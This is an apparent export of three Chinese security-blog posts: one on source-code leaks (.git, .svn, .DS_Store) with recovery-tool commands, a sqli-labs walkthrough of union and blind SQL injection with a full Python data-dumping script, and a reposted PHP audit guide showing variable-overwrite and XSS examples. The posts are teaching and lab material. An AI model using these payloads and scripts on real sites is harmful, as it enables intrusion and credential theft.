[{"title":"常见web源码泄露","url":"https://13m0nade.github.io/2019/08/15/常见web源码泄露/","content":"<p>最近刷题遇到了一道git源码泄露的题目，查阅资料发现还有许多的源码泄露，写下此文记录一下常见的源码泄漏问题。</p>\n<h1>.git源码泄露</h1>\n<p><strong>成因</strong>：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p>\n<p><strong>工具</strong>：<a href=\"https://github.com/lijiejie/GitHack\" target=\"_blank\" rel=\"noopener\">githack</a>      <a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener\">dvcs-ripper</a></p>\n<p><strong>方法</strong>：</p>\n<ol>\n<li><a href=\"http://GitHack.py\" target=\"_blank\" rel=\"noopener\">GitHack.py</a> <a href=\"http://www.example.com/.git/\" target=\"_blank\" rel=\"noopener\">http://www.example.com/.git/</a></li>\n<li><a href=\"http://rip-git.pl\" target=\"_blank\" rel=\"noopener\">rip-git.pl</a> -v -u <a href=\"http://www.example.com/.git/\" target=\"_blank\" rel=\"noopener\">http://www.example.com/.git/</a>  （如果想忽略SSL认证验证使用-s）</li>\n<li>爬虫爬取整个git目录 (这个方法比较原始 , 需要具有一定的Git经验 , 这里重点介绍这种方法 , 但是这种方法和使用githack这个工具相比 , 有一个比较好的地方就是 , 可以完全模拟服务器上的代码环境 , 可以跟踪到git的每一次提交 , 但是githack好像只可以将源码恢复到最近的一次提交 , 这里的好处还有可以去查看git的提交日志 , 这个日志信息中会有开发人员对每一次commit的描述 , 比如某个BUG的修复等等 , 对于这些和BUG相关的地方 , 可以有针对性地进行白盒审计 , 有可能这个BUG修复了还不如没修复 , 可能会造成更大的漏洞)</li>\n</ol>\n<h1>svn 源码泄露</h1>\n<p><strong>成因</strong>：SVN（subversion）是源代码版本管理软件。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。但一些网站管理员在发布代码时，不愿意使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的‘entries’文件，逐步摸清站点结构。</p>\n<p><strong>工具</strong>：<a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener\">dvcs-ripper</a>    seay-SVN  （<a href=\"http://pan.baidu.com/s/1mrNpB\" target=\"_blank\" rel=\"noopener\">下载链接</a>）</p>\n<p><strong>用法</strong>：<a href=\"http://rip-svn.pl\" target=\"_blank\" rel=\"noopener\">rip-svn.pl</a> -v -u <a href=\"http://www.example.com/.svn/\" target=\"_blank\" rel=\"noopener\">http://www.example.com/.svn/</a></p>\n<h1>网站源码压缩备份泄露</h1>\n<p><strong>成因</strong>：一般网站管理员在日常维护中，总会把网站源码给备份一下，防止网站出现问题时，能马上的恢复使用，不过一般的管理员安全意识不高，在备份的时候，会使用一些常见的压缩备份名，而且不光使用常见的备份名字，大部分的管理还会把备份好的源码直接放在网站根目录里，这样给一些不法之徒，提供了一个很方便的渗透思路，或者有些直接不需要渗透了，因为备份中的数据，就已经满足那些不法之徒的需求了。</p>\n<p><strong>工具</strong>：这个其实不是靠工具的，是靠字典的，工具的话，网上任何能扫目录的工具，都可以用来探测源码备份的，不过常见的还是用的 御剑1.5 ，或者自己写的一些扫目录的小脚本工具。</p>\n<h1>.DS_Store文件泄漏</h1>\n<p><strong>成因</strong>：.DS_Store是Mac下Finder用来保存如何展示文件//文件夹的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露。</p>\n<p><strong>实例</strong>：TCL某网站DS_Store文件泄露敏感信息</p>\n<p><strong>工具</strong>：<a href=\"https://github.com/lijiejie/ds_store_exp\" target=\"_blank\" rel=\"noopener\">ds_store_exp</a></p>\n<p><strong>方法</strong>：python ds_store_exp.py <a href=\"http://www.example.com/.DS_Store\" target=\"_blank\" rel=\"noopener\">http://www.example.com/.DS_Store</a></p>\n<h1>.hg源码泄露</h1>\n<p><strong>成因</strong>：hg init的时候会生成.hg（网上资料较少）</p>\n<p><strong>工具</strong>：<a href=\"https://github.com/kost/dvcs-ripper\" target=\"_blank\" rel=\"noopener\">dvcs-ripper</a></p>\n<p><strong>用法</strong>：<a href=\"http://rip-hg.pl\" target=\"_blank\" rel=\"noopener\">rip-hg.pl</a> -v -u <a href=\"http://www.example.com/.hg/\" target=\"_blank\" rel=\"noopener\">http://www.example.com/.hg/</a>  （如果想忽略SSL认证验证使用-s）</p>\n<p><strong>--------------------------------------我不是分割线-------------------------------------</strong></p>\n<p><strong>总结</strong>：源码泄露还有好几个，例如cvs泄露，bzr等，但是在实际的漏洞挖掘中，这些不常见，或者说就前三种，剩下的源码泄露的漏洞都是不好找。</p>\n","categories":["web安全"],"tags":["源码泄露"]},{"title":"解锁SQL注入技能1","url":"https://13m0nade.github.io/2019/08/06/解锁SQL注入技能1/","content":"<h1>解锁SQL注入技能(1)</h1>\n<h2 id=\"sql注入基本流程\"><a class=\"header-anchor\" href=\"#sql注入基本流程\">null</a>SQL注入基本流程</h2>\n<p>1)<strong>首先测试正常数据</strong>，如?id=1</p>\n<p>2)<strong>判断是否存在注入点</strong>，如在?id=1+【‘】、【and 1=1】或【and 1=2】</p>\n<p>3)<strong>判断字段长度</strong>,列数如在?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1’ order by 1=2 #</p>\n<p>4)<strong>判断字段回显位置</strong>，如在?id=1+【‘】+【union select 1,2,3,4,5,6,7,8,9,10,11#】</p>\n<p>5)<strong>判断数据库信息</strong>：<br>\n利用内置函数暴数据库信息<br>\nversion()版本；database()数据库；user()用户；<br>\n不用猜解可用字段暴数据库信息(有些网站不适用):<br>\nand 1=2 union all select version()<br>\nand 1=2 union all select database()<br>\nand 1=2 union all select user()<br>\n操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user<br>\n数据库权限：<br>\nand ord(mid(user(),1,1))=114返回正常说明为root</p>\n<p>6)<strong>查找数据库名</strong><br>\nMysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息union select information_schema from information_schema.schemata （语句在显示位）</p>\n<p>7)<strong>查找数据库表名</strong><br>\nunion select group_concat(table_name) from information_schema.tables where table_schema=database()</p>\n<p>8)<strong>查找列名</strong><br>\nunion select group_concat(column_name) from information_schema.columns where table_name=‘users’ --+</p>\n<p>9)<strong>获取值</strong><br>\nunion select group_concat(username,password) from users–+<br>\n或者1’ union select 1,(select 列名 from 表名),3,4#</p>\n<p>10)<strong>查找数据库表中所有字段以及字段值</strong><br>\nand 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</p>\n<p><strong>判断是否存在注入点</strong><br>\n?id=100’ 返回错误说明有可能注入<br>\n?id=100 and 1=1 返回正常<br>\n?id=100 and 1=2返回错误</p>\n<h2 id=\"开始cxk式操作\"><a class=\"header-anchor\" href=\"#开始cxk式操作\">null</a>开始CXK式操作</h2>\n<p><strong>平台：sqli-labs</strong></p>\n<p><strong>工具：firefox，hackbar</strong></p>\n<p><strong>LV1</strong></p>\n<p>根据名字可知，第一关为基于报错的单引号字符型注入（后续将给出判断过程）。</p>\n<ol>\n<li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1&quot;，是单引号型注入，使用–+注释后页面回显正常。</li>\n<li>使用order by判断字段长度，order by 4时出现报错，3时回显正常，所以字段长度为3.</li>\n<li>使用?id=0’union select 1,2,group_concat(schema_name) from information_schema.schemata --+来查找数据库名（id要为不存在的字段，好让第一句结果为空，直接显示第二句的结果）</li>\n<li>使用?id=0’union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= ‘security’–+查询数据库表名</li>\n<li>id=0’union select 1,2,group_concat(column_name) from information_schema.columns where table_name= ‘users’–+查询数据库列名</li>\n<li>使用?id=0’ union select 1 , group_concat(username) ,group_concat(password)from security.users–+爆出username和password</li>\n</ol>\n<p><strong>LV2</strong></p>\n<ol>\n<li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right<br>\nsyntax to use near ‘’ LIMIT 0,1’ at line 1”可以得到这个sql语句其实并没有单引号，只是用数字进行查询。（或者输入?id=2-1，结果与?id=1相同）</li>\n<li>继续第一关操作，单引号去掉，也不用注释，其它保持不变就行。payload：id=0 union select 1 , group_concat(username) ,group_concat(password)from security.users</li>\n</ol>\n<p><strong>LV3</strong></p>\n<ol>\n<li>在url后输入?id=1页面回显正常，然后加上‘，页面出现报错“You have an error in your SQL syntax check the manual that corresponds to your MariaDB  server version for the right syntax to use near ‘‘1’’) LIMIT 0,1’ at line 1”，加上)–+后显示正常。</li>\n<li>继续1的操作，只要在引号后加上）即可。   ?id=0’) union select 1 , group_concat(username) ,group_concat(password)from security.users–+</li>\n</ol>\n<p><strong>LV4</strong></p>\n<p>在url后输入?id=1页面回显正常，然后加上‘，页面未报错，输入”页面出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘“1&quot;”) LIMIT 0,1’ at line 1“，加上)–+后显示正常。</p>\n<p>继续1的操作，只要在双引号后加上）即可。  ?id=0&quot;) union select 1 , group_concat(username) ,group_concat(password)from security.users–+</p>\n<p><strong>LV5</strong></p>\n<ol>\n<li>输入?id=1显示显示You are in…,输入‘出现报错“You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for theright syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1 ”，注释后显示You are in…。</li>\n<li>尝试之前的注入方法，会发现不再会返回我们注入的信息，如果注入成功的话，页面会返回You are in…，出错的话就不会返回这个字符串，所以这里我们可以进行盲注。</li>\n<li><strong>?id=1’</strong>  <strong>and left(version(),1)=5 %23</strong>    查看版本信息</li>\n<li><strong>?id=1’ and length(database())= 8 %23</strong>    判断数据库长度</li>\n<li>猜测数据库名称（从第一位开始猜）：<br>\n1&gt;猜第1位<br>\n?id=1’ and left(database(),1)&gt;‘a’ %23<br>\n返回正常<br>\n?id=1’ and left(database(),1)&gt;‘z’ %23<br>\n返回错误<br>\n说明第一位在a和z之间<br>\n?id=1’ and left(database(),1)&gt;‘s’ %23<br>\n返回正确<br>\n所以第一位是s<br>\n1&gt;猜第2位<br>\n?id=1’ and left(database(),2)&gt;‘sa’ %23<br>\n返回正常<br>\n?id=1’ and left(database(),2)&gt;‘sz’ %23<br>\n返回错误<br>\n说明第二位在a和z之间<br>\n?id=1’ and left(database(),2)&gt;‘se’ %23<br>\n返回正确<br>\n所以第二位是e<br>\n以此类推，直到推出第8位：最后数据库为security</li>\n<li>猜测数据库（security）中的表：<br>\n?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit a,1)b,1))&gt;n<br>\n说明：<br>\na是从0开始第几个表，b是为第几个字符，n是ASCII所对应的十进制数</li>\n<li>猜用户：<br>\n?id=1’and ord(mid((select ifnull(cast(username as char),0x20)from S. M order by  id  limit A,1),B,1))=N %23<br>\n其中S 为数据库名；M为表名；A为第几个用户；B为第几个字符；N为ASCII码所对应的十进制数。</li>\n<li>猜用户和密码：<br>\n?id=1’  and ord(mid((select ifnull(cast(username as char),0x20)from S.Morder by id limit A,1),B,1))=N %23<br>\n其中S 为数据库名；M为表名；A为第几个用户；B为第几个字符；N为ASCII码所对应的十进制数。<br>\n例：?id=1’  and ord(mid((select ifnull(cast(password as char),0x20)from security.users order by id limit 0,1),1,1))=68 %23</li>\n</ol>\n<p>可直接使用python脚本，具体代码如下（python3）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requestsurl = <span class=\"string\">'http://127.0.0.1/sqlilabs/Less-5/?id=1'</span>db_length = <span class=\"number\">0</span>db_name = <span class=\"string\">''</span>table_num = <span class=\"number\">0</span>table_len = <span class=\"number\">0</span>table_name = <span class=\"string\">''</span>table_list = []column_num = <span class=\"number\">0</span>column_len = <span class=\"number\">0</span>column_name = <span class=\"string\">''</span>column_list = []dump_num = <span class=\"number\">0</span>dump_len = <span class=\"number\">0</span>dump_name = <span class=\"string\">''</span>dump_list = []i = j = k = <span class=\"number\">0</span><span class=\"comment\">### 当前数据库名长度 ###for i in range(1,20):    db_payload = '''' and (length(database())=%d)--+''' %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if \"You are in\" in r.text:        db_length = i        print('当前数据库名长度为：%d' % db_length)        break### 当前数据库名 ###print('开始猜解数据库名......')for i in range(1,db_length+1):    for j in range(95,123):        db_payload = '''' and (left(database(),%d)='%s')--+''' % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if \"You are in\" in r.text:            db_name += chr(j)            # print(db_name)            breakprint('数据库名：\\n[+]',db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = '''' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+''' % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if \"You are in\" in r.text:        table_num = i        breakprint('一共有%d张表' % table_num)print('开始猜解表名......')### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = ''    #### 表名长度 ####    for j in range(1,21):        db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit %d,1),%d,1))--+''' % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if \"You are in\" not in r.text:            table_len = j-1            #### 猜解表名 ####            for k in range(1,table_len+1):                for l in range(95,123):                    db_payload = '''' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d--+''' % (i,k,l)                    # print(db_payload)                    r = requests.get(url+db_payload)                    # print(db_payload)                    if \"You are in\" in r.text:                        table_name += chr(l)            print(table_name)            table_list.append(table_name)            breakprint('表名：',table_list)### 每个表的列的数目、列名及列名长度 ###for i in table_list:    #### 每个表的列的数目 ####    for j in range(100):        db_payload = '''' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+''' % (        j, i)        r = requests.get(url + db_payload)        if \"You are in\" in r.text:            column_num = j            print((\"[+] 表名：%-10s\\t\" % i) + str(column_num) + '字段')            break#### 猜解列名长度 ####column_num = 3print('%s表中的列名：' % table_list[-1])for j in range(3):    column_name = ''    for k in range(1,21):        db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name=\"%s\" limit %d,1),%d,1))--+''' % (table_list[-1],j,k)        r = requests.get(url+db_payload)        if \"You are in\" not in r.text:            column_len = k-1            # print(column_len)            break        #### 猜解列名 ####        for l in range(95,123):            db_payload = '''' and ascii(substr((select column_name from information_schema.columns where table_name=\"%s\" limit %d,1),%d,1))=%d--+''' % (table_list[-1],j,k,l)            r = requests.get(url + db_payload)            if \"You are in\" in r.text:                column_name += chr(l)    print('[+] ',column_name)    column_list.append(column_name)print('开始爆破以下字段：',column_list[1:])for column in column_list[1:]:    print(column,'：')    dump_num = 0    for i in range(30):        db_payload = '''' and %d=(select count(%s) from %s.%s)--+''' % (i,column,db_name,table_list[-1])        # print(db_payload)        r = requests.get(url+db_payload)        if \"You are in\" in r.text:            dump_num = i            # print(i)            break    for i in range(dump_num):        dump_len = 0        dump_name = ''        #### 字段长度 ####        for j in range(1, 21):            db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+''' % (column,db_name,table_list[-1],i,j)            r = requests.get(url + db_payload)            if \"You are in\" not in r.text:                dump_len = j-1                for k in range(1, dump_len + 1):                    for l in range(1,256):                        db_payload = '''' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))=%d--+''' % (column,db_name,table_list[-1],i,k,l)                        # print(db_payload)                        r = requests.get(url+db_payload)                        if \"You are in\" in r.text:                            dump_name += chr(l)                            # print(dump_name)                            break                break        print('[+]',dump_name)</span></span><br></pre></td></tr></table></figure>\n<p>因篇幅过长下次更新。。。</p>\n<p>敬请关注：-）</p>\n","categories":["web安全"],"tags":["sql注入"]},{"title":"高级PHP应用程序漏洞审核技术","url":"https://13m0nade.github.io/2019/07/30/高级PHP应用程序漏洞审核技术/","content":"<h1>高级PHP应用程序漏洞审核技术（转载）</h1>\n<ul>\n<li>前言</li>\n<li>传统的代码审计技术</li>\n<li>PHP版本与应用代码审计</li>\n<li>其他的因素与应用代码审计</li>\n<li>扩展我们的字典\n<ul>\n<li>变量本身的key</li>\n<li>变量覆盖\n<ul>\n<li>遍历初始化变量</li>\n<li>parse_str()变量覆盖漏洞</li>\n<li>import_request_variables()变量覆盖漏洞</li>\n<li>PHP5 Globals</li>\n</ul>\n</li>\n<li>magic_quotes_gpc与代码安全\n<ul>\n<li>什么是magic_quotes_gpc</li>\n<li>哪些地方没有魔术引号的保护</li>\n<li>变量的编码与解码</li>\n<li>二次攻击</li>\n<li>魔术引号带来的新的安全问题</li>\n<li>变量key与魔术引号</li>\n</ul>\n</li>\n<li>代码注射\n<ul>\n<li>PHP中可能导致代码注射的函数</li>\n<li>变量函数与双引号</li>\n</ul>\n</li>\n<li>PHP自身函数漏洞及缺陷\n<ul>\n<li>PHP函数的溢出漏洞</li>\n<li>PHP函数的其他漏洞</li>\n<li>session_destroy()删除文件漏洞</li>\n<li>随机函数</li>\n</ul>\n</li>\n<li>特殊字符\n<ul>\n<li>截断\n<ul>\n<li>include截断</li>\n<li>数据截断</li>\n<li>文件操作里的特殊字符</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>怎么进一步寻找新的字典</li>\n<li>DEMO</li>\n<li>后话</li>\n<li>附录</li>\n</ul>\n<h2 id=\"前言\"><a class=\"header-anchor\" href=\"#前言\">null</a>前言</h2>\n<p>PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。</p>\n<p>另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）</p>\n<h2 id=\"传统的代码审计技术\"><a class=\"header-anchor\" href=\"#传统的代码审计技术\">null</a>传统的代码审计技术</h2>\n<p>WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc<code>[</code>$<code>_</code>GET,$<code>_</code>POST,$<code>_</code>COOKIE<code>]</code>，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。</p>\n<p>PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。</p>\n<p>其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。</p>\n<h2 id=\"php版本与应用代码审计\"><a class=\"header-anchor\" href=\"#php版本与应用代码审计\">null</a>PHP版本与应用代码审计</h2>\n<p>到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">php4</th>\n<th style=\"text-align:left\">68%</th>\n<th style=\"text-align:left\">2000-2007，No security fixes after 2008/08，最终版本是php4.4.9</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">php5</td>\n<td style=\"text-align:left\">32%</td>\n<td style=\"text-align:left\">2004-present，Now at version 5.2.6（PHP 5.3 alpha1 released!）</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">php6</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">目前还在测试阶段，变化很多做了大量的修改，取消了很多安全选项如magic_quotes_gpc（这个不是今天讨论的范围）</td>\n</tr>\n</tbody>\n</table>\n<p>由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。</p>\n<h2 id=\"其他的因素与应用代码审计\"><a class=\"header-anchor\" href=\"#其他的因素与应用代码审计\">null</a>其他的因素与应用代码审计</h2>\n<p>很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/<code>*</code>nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。</p>\n<p>所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。</p>\n<h2 id=\"扩展我们的字典\"><a class=\"header-anchor\" href=\"#扩展我们的字典\">null</a>扩展我们的字典</h2>\n<p>下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。</p>\n<h3 id=\"变量本身的key\"><a class=\"header-anchor\" href=\"#变量本身的key\">null</a>变量本身的key</h3>\n<p>说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></span><br><span class=\"line\"><span class=\"comment\">//print_R($_GET); </span></span><br><span class=\"line\"> <span class=\"keyword\">foreach</span> ($_GET <span class=\"keyword\">AS</span> $key =&gt; $value)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> $key.<span class=\"string\">\"\\n\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key.php?&lt;script&gt;alert(1);&lt;/script&gt;=1&amp;bbb=2</span><br></pre></td></tr></table></figure>\n<p>那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：）</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n\n\n\n<h3 id=\"变量覆盖\"><a class=\"header-anchor\" href=\"#变量覆盖\">null</a>变量覆盖</h3>\n<p>很多的漏洞查找者都知道extract()这个函数在指定参数为EXTR_OVERWRITE或者没有指定函数可以导致变量覆盖，但是还有很多其他情况导致变量覆盖的如：</p>\n<h4 id=\"遍历初始化变量\"><a class=\"header-anchor\" href=\"#遍历初始化变量\">null</a>遍历初始化变量</h4>\n<p>请看如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//var.php?a=fuck</span></span><br><span class=\"line\">$a=<span class=\"string\">'hi'</span>;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_GET <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">\t$$key = $value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">print</span> $a;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$chs = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_POST &amp;&amp; $charset != <span class=\"string\">'utf-8'</span>) &#123;</span><br><span class=\"line\">\t$chs = <span class=\"keyword\">new</span> Chinese(<span class=\"string\">'UTF-8'</span>, $charset);</span><br><span class=\"line\">\t<span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">\t\t$$key = $chs-&gt;Convert($value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">unset</span>($chs);</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 </td></tr></tbody></table>\n\n\n\n<h4 id=\"parse-str-变量覆盖漏洞\"><a class=\"header-anchor\" href=\"#parse-str-变量覆盖漏洞\">null</a>parse_str()变量覆盖漏洞</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//var.php?var=new</span></span><br><span class=\"line\">$var = <span class=\"string\">'init'</span>;                     </span><br><span class=\"line\">parse_str($_SERVER[<span class=\"string\">'QUERY_STRING'</span>]); </span><br><span class=\"line\"><span class=\"keyword\">print</span> $var;</span><br></pre></td></tr></table></figure>\n<p>该函数一样可以覆盖数组变量，上面的代码是通过$<code>_</code>SERVER[‘QUERY_STRING’]来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//var.php?var=1&amp;a[1]=var1%3d222</span></span><br><span class=\"line\">$var1 = <span class=\"string\">'init'</span>;</span><br><span class=\"line\">parse_str($a[$_GET[<span class=\"string\">'var'</span>]]);</span><br><span class=\"line\"><span class=\"keyword\">print</span> $var1;</span><br></pre></td></tr></table></figure>\n<p>上面的代码通过提交$var来实现对$var1的覆盖。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略（parse_str）</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符parse_str </td></tr></tbody></table>\n\n\n\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"><strong>漏洞审计策略（mb_parse_str）</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">PHP版本要求：php4&lt;4.4.7 php5&lt;5.2.2<br>系统要求：无<br>审计策略：查找字符mb_parse_str </td></tr></tbody></table>\n\n\n\n<h4 id=\"import-request-variables-变量覆盖漏洞\"><a class=\"header-anchor\" href=\"#import-request-variables-变量覆盖漏洞\">null</a>import_request_variables()变量覆盖漏洞</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//var.php?_SERVER[REMOTE_ADDR]=10.1.1.1</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'GLOBALS '</span>.(int)ini_get(<span class=\"string\">\"register_globals\"</span>).<span class=\"string\">\"n\"</span>;</span><br><span class=\"line\">import_request_variables(<span class=\"string\">'GPC'</span>);</span><br><span 